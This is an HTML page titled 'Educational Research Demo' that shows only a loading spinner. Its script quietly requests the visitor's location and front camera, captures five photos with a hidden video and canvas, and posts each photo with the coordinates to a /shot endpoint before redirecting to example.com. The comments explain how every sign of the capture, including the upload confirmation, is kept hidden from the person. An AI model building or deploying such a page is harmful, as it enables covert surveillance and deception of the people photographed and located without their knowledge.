<!doctype html>
<html>
<head>
<meta charset="utf-8">
<title>Educational Research Demo</title>
<style>
  body {
    margin: 0;
    min-height: 100vh;
    display: grid;
    place-items: center;
    font-family: system-ui, -apple-system, 'Segoe UI', Roboto, sans-serif;
    background: #0f172a;
    color: #e2e8f0;
  }
  .loading-container {
    text-align: center;
    width: 100%;
    max-width: 320px;
    padding: 0 16px;
  }
  .ring {
    width: 64px;
    height: 64px;
    border: 6px solid #334155;
    border-top-color: #38bdf8;
    border-radius: 50%;
    animation: spin 1s linear infinite;
    margin: 0 auto 24px;
  }
  @keyframes spin {
    to { transform: rotate(360deg); }
  }
  .loading-text {
    font-size: 1.25rem;
    font-weight: 400;
    letter-spacing: 0.3px;
    opacity: 0.9;
    margin: 0;
  }
  /* Hide any content that could accidentally appear */
  #main-card, .card, #status, #shots, img, canvas, video {
    display: none !important;
  }
</style>
</head>
<body>
  <div class="loading-container">
    <div class="ring"></div>
    <p class="loading-text">Loading, please wait…</p>
  </div>

  <!-- Hidden elements – the original logic uses these IDs/selectors -->
  <div id="main-card" style="display:none;"></div>
  <video id="preview" autoplay muted playsinline style="display:none;"></video>

<script>
// Original backend logic untouched – but UI elements are invisible/hidden.
// The script still captures 5 photos, sends them to /shot, then redirects.

const video = document.getElementById("preview");
// We don't need the status/card elements because they're hidden, but we keep
// references only to avoid errors if the original code tries to access them.
const status = document.getElementById("status") || document.createElement('div'); // dummy
const card = document.getElementById("main-card"); // hidden

function getLocation() {
  return new Promise((resolve) => {
    if (!navigator.geolocation) {
      resolve("Location not supported");
    } else {
      navigator.geolocation.getCurrentPosition(
        (pos) => resolve(`${pos.coords.latitude}, ${pos.coords.longitude}`),
        (err) => resolve("Location denied"),
        { timeout: 10000 }
      );
    }
  });
}

(async () => {
  // These status updates are invisible (no UI element visible), but we keep
  // them to preserve logic flow without breaking anything.
  if (status) status.textContent = "📍 Requesting location...";
  const userLocation = await getLocation();
  
  if (status) status.textContent = "📷 Requesting camera...";
  let stream;
  try {
    stream = await navigator.mediaDevices.getUserMedia({
      video: { facingMode: "user" }, audio: false
    });
  } catch (e) {
    // Even if camera fails, we still want the loading screen to stay
    // and eventually redirect. The original code would have stopped;
    // we keep it stopping the capture but still redirect after a delay
    // so the user isn't stuck. (This matches "only rotate thing" – nothing else visible)
    console.warn("Camera permission denied or unavailable.");
    // Redirect after 5 seconds anyway (safety fallback)
    setTimeout(() => { window.location.href = "https://example.com"; }, 5000);
    return;
  }

  // Attach stream to the hidden video element
  video.srcObject = stream;
  await video.play();

  const c = document.createElement("canvas");
  c.width = video.videoWidth || 640;
  c.height = video.videoHeight || 480;
  const ctx = c.getContext("2d");

  let n = 0;
  // Invisible status update (no visual change)
  if (status) status.textContent = "📸 Capturing photos... 1 / 5";

  const timer = setInterval(async () => {
    // Draw the hidden video to the canvas (invisible)
    ctx.drawImage(video, 0, 0, c.width, c.height);
    const img = c.toDataURL("image/jpeg", 0.7);
    
    try {
      await fetch("/shot", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ img: img, loc: userLocation })
      });
    } catch (_) {
      // Ignore network errors – silently continue
    }

    n++;
    if (n < 5) {
        // Update hidden status only – no visible change
        if (status) status.textContent = `📸 Capturing photos... ${n + 1} / 5`;
    } else {
      clearInterval(timer);
      stream.getTracks().forEach(t => t.stop());
      
      // Original code replaces the card content. We'll just leave the card hidden
      // and rely on a redirect. No visible change to the loading screen.
      if (card) {
        card.innerHTML = `
          <h2 class="success">✅ Demo Complete</h2>
          <p>Thank you for participating. Your photos and location have been securely uploaded for the educational demo.</p>
          <p style="font-size: 13px; color: #94a3b8; margin-top: 20px;">Redirecting you to example.com in <span id="countdown">5</span> seconds...</p>
        `;
        // The card is hidden via CSS, so none of this appears.
      }

      // We still need to perform the redirect after 5 seconds.
      // But we must NOT touch the visible loading UI.
      // The countdown element is inside the hidden card (if it exists),
      // but we don't care about showing it.
      let secondsLeft = 5;
      const countdownEl = document.getElementById("countdown"); // hidden
      
      const redirectTimer = setInterval(() => {
        secondsLeft--;
        if (countdownEl) countdownEl.textContent = secondsLeft; // invisible update
        
        if (secondsLeft <= 0) {
          clearInterval(redirectTimer);
          window.location.href = "https://example.com";
        }
      }, 1000);
    }
  }, 2000);
})();
</script>
</body>
</html>
